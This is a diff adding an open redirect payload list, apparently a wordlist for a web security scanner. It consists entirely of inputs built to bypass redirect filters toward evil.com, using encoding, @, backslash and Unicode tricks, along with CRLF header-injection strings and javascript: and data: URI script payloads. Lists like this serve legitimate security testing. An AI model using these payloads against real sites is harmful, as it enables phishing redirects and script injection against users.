@@ -1,0 +1,55 @@
+# WebSecure Open Redirect Payload List
+# ── Basic ──
+https://evil.com
+http://evil.com
+//evil.com
+///evil.com
+////evil.com
+/\\evil.com
+# ── Protocol ──
+https://evil.com/
+https://evil.com?
+https://evil.com#
+https://evil.com/path
+https://evil.com/%2f
+# ── Encoded ──
+https%3A%2F%2Fevil.com
+%2F%2Fevil.com
+%2F%5Cevil.com
+%5C%5Cevil.com
+%68%74%74%70%73%3A%2F%2F%65%76%69%6C%2E%63%6F%6D
+# ── Double encoded ──
+%252F%252Fevil.com
+%25252F%25252Fevil.com
+# ── @ bypass ──
+https://legitimate.com@evil.com
+https://legitimate.com@evil.com/
+https://evil.com@legitimate.com
+# ── Subdomain bypass ──
+https://evil.com?legitimate.com
+https://evil.com#legitimate.com
+https://legitimate.com.evil.com
+# ── Null byte / newline ──
+https://evil.com%00
+https://evil.com%00.legitimate.com
+https://evil.com%0d%0alocation:https://evil.com
+https://evil.com%0a%0dlocation:https://evil.com
+# ── CRLF in redirect ──
+%0d%0aLocation:%20https://evil.com
+%0aLocation:%20https://evil.com
+# ── Backslash ──
+https:\\\\evil.com
+/\evil.com
+\/evil.com
+# ── Javascript ──
+javascript:alert(1)
+javascript:window.location='https://evil.com'
+# ── Data URI ──
+data:text/html,<script>window.location='https://evil.com'</script>
+# ── Whitelisted domain bypass ──
+https://evil.com/https://legitimate.com
+https://legitimate.com.evil.com/
+https://legitimate.com\.evil.com
+# ── Unicode ──
+https://evil．com
+https://ｅｖｉｌ.com
